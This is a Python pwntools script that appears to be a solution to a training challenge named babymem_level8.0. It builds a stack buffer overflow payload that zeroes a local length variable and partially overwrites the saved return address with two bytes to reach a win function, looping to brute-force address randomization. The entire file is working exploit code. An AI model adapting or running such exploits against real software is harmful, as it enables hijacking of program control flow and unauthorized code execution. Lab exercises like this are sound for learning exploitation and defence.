from pwn import *

while(1):
    # Init
    elf = ELF("/challenge/babymem_level8.0")

    buffer_length = int("58", 16) #local_58
    length_variable_distance = int("28", 16) #local_28
    dimension_control = int("24", 16) #0x24
    distance_between_buffer_length_and_length_variable = buffer_length - length_variable_distance - 8 - 8 #ret_address and base pointer
    print(distance_between_buffer_length_and_length_variable)

    word_local_28 = p64(0x0)

    offset_win_auth = b"\xe6\x1a"

    io = elf.process()

    # Payload
    payload = b"A"*(distance_between_buffer_length_and_length_variable) + word_local_28 + b"A"*(buffer_length - distance_between_buffer_length_and_length_variable - 8) + offset_win_auth

    # Interaction
    io.recvuntil("size:")
    io.sendline(str(buffer_length + 2))

    io.recvuntil("bytes)!")
    io.sendline(payload)

    io.interactive()


